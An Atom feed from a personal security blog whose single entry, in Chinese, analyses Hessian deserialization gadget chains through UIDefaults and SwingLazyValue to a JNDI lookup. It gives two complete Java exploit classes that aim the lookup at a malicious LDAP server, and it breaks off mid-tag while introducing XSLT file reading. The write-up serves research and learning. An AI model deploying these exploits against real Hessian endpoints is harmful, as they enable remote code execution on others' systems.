<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clown的站点</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2025-03-30T14:58:06.299Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hessian利用链</title>
    <link href="https://clowsman.github.io/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>https://clowsman.github.io/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2025-03-30T14:55:05.000Z</published>
    <updated>2025-03-30T14:58:06.299Z</updated>
    
    <content type="html"><![CDATA[<p>水一下博客，之前这篇写在本地了，现在放到博客方便用的时候看，因为前面nacos的时候用到了一些</p><p>这两条链子都是基于原生jdk的，不需要其他依赖</p><h1 id="multiuidefaults利用链"><a href="#MultiUIDefaults利用链" class="headerlink" title="MultiUIDefaults利用链"></a>MultiUIDefaults利用链</h1><p>链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>toString的触发利用Hessian的异常toString来触发即可</p><p>这个链是从 MultiUIDefaults 的 toString 方法开始，一路调用到 SwingLazyValue 的 createValue（但是SwingLazyValue 好像在 jdk8 之后删了）</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>那就开始分析利用链，从createValue方法开始</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">createValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> UIDefaults table)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ReflectUtil.checkPackageAccess(className);<br>            Class&lt;?&gt; c = Class.forName(className, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">if</span> (methodName != <span class="hljs-literal">null</span>) &#123;<br>                Class[] types = getClassArray(args);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(methodName, types);<br>                makeAccessible(m);<br>                <span class="hljs-keyword">return</span> m.invoke(c, args);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                Class[] types = getClassArray(args);<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getConstructor(types);<br>                makeAccessible(constructor);<br>                <span class="hljs-keyword">return</span> constructor.newInstance(args);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// Ideally we would throw an exception, unfortunately</span><br>            <span class="hljs-comment">// often times there are errors as an initial look and</span><br>            <span class="hljs-comment">// feel is loaded before one can be switched. Perhaps a</span><br>            <span class="hljs-comment">// flag should be added for debugging, so that if true</span><br>            <span class="hljs-comment">// the exception would be thrown.</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在这里调用了Class.forName，也就是可以类的静态代码块代码</p><p>然后这里使用的 getMethod 和 getConstructor 都只能获取到 public 方法，而 invoke 的第一个参数是一个 class 而不是对象实例，所以这里的效果就是可以调用任意 public 的 static 方法，所以最后可以打jndi，利用InitialContext.doLookup()静态方法</p><p>然后也是网上找引用，到UIDefaults.getFromHashTable这里</p><p><img src="https://cdn.clown2024.cn/image-20241127162219555.png" alt="image-20241127162219555"></p><p>这个value是通过get键的值获取的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getFromHashtable</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object key)</span> &#123;<br>       <span class="hljs-comment">/* Quickly handle the common case, without grabbing</span><br><span class="hljs-comment">        * a lock.</span><br><span class="hljs-comment">        */</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.get(key);<br>       <span class="hljs-keyword">if</span> ((value != PENDING) &amp;&amp;<br>           !(value <span class="hljs-keyword">instanceof</span> ActiveValue) &amp;&amp;<br>           !(value <span class="hljs-keyword">instanceof</span> LazyValue)) &#123;<br>           <span class="hljs-keyword">return</span> value;<br>       &#125;<br></code></pre></td></tr></table></figure><p>UIDefaults这个类本身就是继承Hashtable的，所以我们传的这个value还需要是LazyValue的实例，而SwingLazyValue就实现了LazyValue接口</p><p><img src="https://cdn.clown2024.cn/image-20241127172000151.png" alt="image-20241127172000151"></p><p>然后UIDefaults.get方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getFromHashtable( key );<br>        <span class="hljs-keyword">return</span> (value != <span class="hljs-literal">null</span>) ? value : getFromResourceBundle(key, <span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后MultiUIDefaults#toString方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        buf.append(<span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">keys</span> <span class="hljs-operator">=</span> keys();<br>        <span class="hljs-keyword">while</span> (keys.hasMoreElements()) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keys.nextElement();<br>            buf.append(key + <span class="hljs-string">&quot;=&quot;</span> + get(key) + <span class="hljs-string">&quot;, &quot;</span>);<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> buf.length();<br>        <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">1</span>) &#123;<br>            buf.delete(length-<span class="hljs-number">2</span>, length);<br>        &#125;<br>        buf.append(<span class="hljs-string">&quot;&#125;&quot;</span>);<br>        <span class="hljs-keyword">return</span> buf.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是这个链子用不了，根据文章说这是从xstream的历史链中参考来的</p><p>xstream的历史链如下，<a href="https://x-stream.github.io/CVE-2021-21346.html">https://x-stream.github.io/CVE-2021-21346.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Rdn$RdnEntry#compareTo-&gt;<br>    XString#equal-&gt;<br>        MultiUIDefaults#toString-&gt;<br>            UIDefaults#get-&gt;<br>                UIDefaults#getFromHashTable-&gt;<br>                    UIDefaults$LazyValue#createValue-&gt;<br>                        SwingLazyValue#createValue-&gt;<br>                            InitialContext#doLookup()<br></code></pre></td></tr></table></figure><blockquote><p>但更离谱的是我是连MultiUIDefaults这个类都创建不了的，而且看了MultiUIDefaults这个类，构造方法也是public的啊，怪了</p><p><img src="https://cdn.clown2024.cn/image-20241127164823491.png" alt="image-20241127164823491"></p><p>他们的用不了反序列化报错是这样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.IllegalAccessException: Class com.caucho.hessian.io.MapDeserializer can not access a member of class javax.swing.MultiUIDefaults with modifiers &quot;public&quot;<br></code></pre></td></tr></table></figure><p>喔原来是作用域的问题，因为该类没有修饰符，所以只能在javax.swing包内访问，那么Hessian就没有办法反序列化这个类了，因为Hessian2 拿到了构造器，但是没有 setAccessable，newInstance 就没有权限</p></blockquote><p>所以MultiUIDefaults这个类得换一下，找个平替</p><p>要找类需要是 public 的，构造器也是 public 的，构造器的参数个数不要紧，hessian2 会自动挨个测试构造器直到成功</p><p>然后是找到这个类<strong>MimeTypeParameterList</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>    buffer.ensureCapacity(<span class="hljs-built_in">this</span>.parameters.size() * <span class="hljs-number">16</span>);<br>    <span class="hljs-type">Enumeration</span> <span class="hljs-variable">keys</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.parameters.keys();<br><br>    <span class="hljs-keyword">while</span>(keys.hasMoreElements()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (String)keys.nextElement();<br>        buffer.append(<span class="hljs-string">&quot;; &quot;</span>);<br>        buffer.append(key);<br>        buffer.append(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        buffer.append(quote((String)<span class="hljs-built_in">this</span>.parameters.get(key)));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> buffer.toString();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个parameters属性就是一个Hashtable</p><p><img src="https://cdn.clown2024.cn/image-20241127170703885.png" alt="image-20241127170703885"></p><p>现在链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MimeTypeParameterList.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>那就可以编写异常触发toString的exp了</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MimeTypeParameterListExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//构造恶意类</span><br>        <span class="hljs-type">MimeTypeParameterList</span> <span class="hljs-variable">mimeTypeParameterList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimeTypeParameterList</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:8085/TaeXQxXj&quot;</span>&#125;);<br>        uiDefaults.put(<span class="hljs-string">&quot;clown&quot;</span>,swingLazyValue);<br>        setField(mimeTypeParameterList,<span class="hljs-string">&quot;parameters&quot;</span>,uiDefaults);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(mimeTypeParameterList);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用yaki起了一个恶意ldap服务</p><p><img src="https://cdn.clown2024.cn/image-20241127173030719.png" alt="image-20241127173030719"></p><p><img src="https://cdn.clown2024.cn/image-20241127173045646.png" alt="image-20241127173045646"></p><h1 id="pkcs9attributes利用链"><a href="#PKCS9Attributes利用链" class="headerlink" title="PKCS9Attributes利用链"></a>PKCS9Attributes利用链</h1><p>这是另一条利用链，说是在nacos的raft反序列化中出现过，到时候看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PKCS9Attributes#toString-&gt;<br>   PKCS9Attributes#getAttribute-&gt;<br>     UIDefaults#get-&gt;<br>        UIDefaults#getFromHashTable-&gt;<br>           UIDefaults$LazyValue#createValue-&gt;<br>                SwingLazyValue#createValue-&gt;<br>                   InitialContext#doLookup()<br></code></pre></td></tr></table></figure><p>这里后面的部分也没有变化，只是前面触发get方法的地方变了，简单看看</p><p>PKCS9Attributes#toString</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">200</span>);<br>        buf.append(<span class="hljs-string">&quot;PKCS9 Attributes: [\n\t&quot;</span>);<br><br>        ObjectIdentifier oid;<br>        PKCS9Attribute value;<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; PKCS9Attribute.PKCS9_OIDS.length; i++) &#123;<br>            value = getAttribute(PKCS9Attribute.PKCS9_OIDS[i]);<br><br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// we have a value; print it</span><br>            <span class="hljs-keyword">if</span> (first)<br>                first = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">else</span><br>                buf.append(<span class="hljs-string">&quot;;\n\t&quot;</span>);<br><br>            buf.append(value.toString());<br>        &#125;<br><br>        buf.append(<span class="hljs-string">&quot;\n\t] (end PKCS9 Attributes)&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> buf.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里遍历PKCS9_OIDS，PKCS9_OIDS是ObjectIdentifier类数组</p><p><img src="https://cdn.clown2024.cn/image-20241127192307756.png" alt="image-20241127192307756"></p><p>然后调用getAttribute方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> PKCS9Attribute <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(ObjectIdentifier oid)</span> &#123;<br>    <span class="hljs-keyword">return</span> attributes.get(oid);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后调用get方法，这里的attributes是一个Hashtable</p><p><img src="https://cdn.clown2024.cn/image-20241127192511001.png" alt="image-20241127192511001"></p><p>那就直接写一个exp出来可以</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PKCS9AttributesExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//构造恶意类</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:8085/TaeXQxXj&quot;</span>&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127193819235.png" alt="image-20241127193819235"></p><p>然后这里有一个小知识点，我这里一开始很好奇，为什么我可以强制修改PKCS9Attributes的attributes属性，明明泛型都不一样，问了一下通灵义码，解释如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Java 的泛型在运行时会被擦除，因此在运行时不会检查泛型类型。这就是为什么你可以通过反射将 UIDefaults 设置为 attributes 字段而没有立即抛出错误的原因<br></code></pre></td></tr></table></figure><p>原来如此</p><p>而且这个gadget在jdk8可以通杀，因为是原生的链子的，可用性非常高</p><h1 id="xslt代码执行"><a href="#XSLT代码执行" class="headerlink" title="XSLT代码执行"></a>XSLT代码执行</h1><p>这里拉在一起学了，因为用hessian打内存马的时候用到了</p><p>看这篇文章：<a href="https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&u_asig=0a472f5217326934441316160e013b">https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&amp;u_asig=0a472f5217326934441316160e013b</a></p><h2 id="xslt介绍"><a href="#XSLT介绍" class="headerlink" title="XSLT介绍"></a>XSLT介绍</h2><p>XSLT（Extensible Stylesheet Language Transformations，可扩展<a href="https://so.csdn.net/so/search?q=%E6%A0%B7%E5%BC%8F%E8%A1%A8%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">样式表语言</a>转换）是一种用于将XML文档转换成HTML、文本、或其他XML文档的语言。它基于XPath和XSL，是W3C（万维网联盟）定义的一个标准。</p><p>基本语法：</p><p>xsl:stylesheet：根元素，定义了转换的基本信息，如版本号和命名空间。<br>xsl:template：定义转换模板，可以包含匹配模式和模板规则。<br>xsl:for-each：用于迭代XML文档中的节点集合。<br>xsl:if、xsl:choose、xsl:when：条件语句，用于基于条件选择不同的转换路径。<br>xsl:value-of：用于输出XML节点的文本内容。<br>xsl:variable：定义变量，用于存储和重用转换过程中的数据。<br>xsl:param：定义参数，允许在调用模板时传递参数。<br>xsl:include、xsl:import：用于包含或导入其他XSLT样式表。</p><p>具体的可以去看一下菜鸟：<a href="https://www.runoob.com/xsl/xsl-tutorial.html">https://www.runoob.com/xsl/xsl-tutorial.html</a></p><h2 id="恶意利用"><a href="#恶意利用" class="headerlink" title="恶意利用"></a>恶意利用</h2><p>xslt是有一些函数的，其中一些函数或者标签是我们能够利用的，可以去翻看官方文档</p><h3 id="system-property"><a href="#system-property" class="headerlink" title="system-property()"></a>system-property()</h3><p>这个函数可以用来返回系统属性的值。</p><p>语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">system-property(name)<br></code></pre></td></tr></table></figure><p>相关描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xsl:version，一个数字，表示处理器实现的XSLT版本；对于实现本文档指定的XSLT版本的XSLT处理器，这是数字1.0<br>xsl:vendor，一个标识XSLT处理器供应商的字符串<br>xsl:vendor-url，一个包含标识XSLT处理器供应商的url的字符串；通常，这是供应商网站的主页。<br></code></pre></td></tr></table></figure><p>用法</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="document"><a href="#document" class="headerlink" title="document()"></a>document()</h3><p>用于访问外部 XML 文档中的节点。</p><p>因为他的传参为URI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">document( URI [,node-set] )<br></code></pre></td></tr></table></figure><p>所以可以读取文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> 